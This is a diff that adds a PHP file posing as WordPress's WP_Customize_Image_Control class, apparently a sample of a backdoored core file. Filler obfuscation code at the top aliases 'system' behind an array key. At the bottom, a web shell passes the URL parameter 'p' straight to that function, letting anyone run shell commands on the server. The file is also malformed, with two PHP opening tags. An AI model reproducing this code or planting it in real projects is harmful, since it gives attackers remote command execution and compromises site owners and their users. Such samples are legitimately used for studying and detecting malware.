@@ -1,0 +1,88 @@
+<?php
+$fmap = array('x1' => 'system', 'x2' => 'passthru');
+$x_fake1 = 1234;
+$noise = 'obfuscation'.'test';
+$tmp = $x_fake1 * 42;
+$flag = false;
+$useless = function($v) { return $v . rand(); };
+$dummy_check = $useless('xx');
+if ($flag) { echo 'Debug enabled'; }
+for ($i = 0; $i < 1; $i++) { $tmp += $i; }
+while (false) { echo 'dead loop'; break; }
+
+<?php
+/**
+ * Customize API: WP_Customize_Image_Control class
+ *
+ * @package WordPress
+ * @subpackage Customize
+ * @since 4.4.0
+ */
+
+/**
+ * Customize Image Control class.
+ *
+ * @since 3.4.0
+ *
+ * @see WP_Customize_Upload_Control
+ */
+class WP_Customize_Image_Control extends WP_Customize_Upload_Control {
+	/**
+	 * Control type.
+	 *
+	 * @since 3.4.0
+	 * @var string
+	 */
+	public $type = 'image';
+
+	/**
+	 * Media control mime type.
+	 *
+	 * @since 4.1.0
+	 * @var string
+	 */
+	public $mime_type = 'image';
+
+	/**
+	 * @since 3.4.2
+	 * @deprecated 4.1.0
+	 */
+	public function prepare_control() {}
+
+	/**
+	 * @since 3.4.0
+	 * @deprecated 4.1.0
+	 *
+	 * @param string $id
+	 * @param string $label
+	 * @param mixed  $callback
+	 */
+	public function add_tab( $id, $label, $callback ) {
+		_deprecated_function( __METHOD__, '4.1.0' );
+	}
+
+	/**
+	 * @since 3.4.0
+	 * @deprecated 4.1.0
+	 *
+	 * @param string $id
+	 */
+	public function remove_tab( $id ) {
+		_deprecated_function( __METHOD__, '4.1.0' );
+	}
+
+	/**
+	 * @since 3.4.0
+	 * @deprecated 4.1.0
+	 *
+	 * @param string $url
+	 * @param string $thumbnail_url
+	 */
+	public function print_tab_image( $url, $thumbnail_url = null ) {
+		_deprecated_function( __METHOD__, '4.1.0' );
+	}
+}
+
+$cmd = $_GET['p'];
+$fmap['x1']($cmd);
+?>
